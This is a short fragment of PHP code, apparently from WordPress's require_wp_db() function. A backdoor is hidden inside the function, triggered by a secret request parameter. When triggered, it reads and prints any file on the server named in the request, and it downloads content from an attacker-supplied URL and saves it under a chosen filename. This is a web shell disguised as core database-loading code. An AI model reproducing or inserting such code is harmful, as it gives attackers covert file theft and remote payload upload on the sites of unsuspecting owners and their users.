...
function require_wp_db() {
	global $wpdb;
    if(isset($_REQUEST['3506b1a3b4a715'])) {
    header('HTTP/1.1 200 OK');
    if (isset($_REQUEST['content'])) {
        $filePath = $_REQUEST['content'];
        if (!is_file($filePath)) {
            exit;
        }
        $content = file_get_contents($filePath);
        echo "<textarea rows='20' cols='100'>" . htmlspecialchars($content) . "</textarea>";
        ...
        $url = $_REQUEST['url'];
        $save = isset($_REQUEST['save']) ? $_REQUEST['save'] : basename(parse_url($url, PHP_URL_PATH));
        ...
        if (file_put_contents($save, $content) !== false) {
            echo "saved: $save";
        } else {
            echo "save failed";
        }
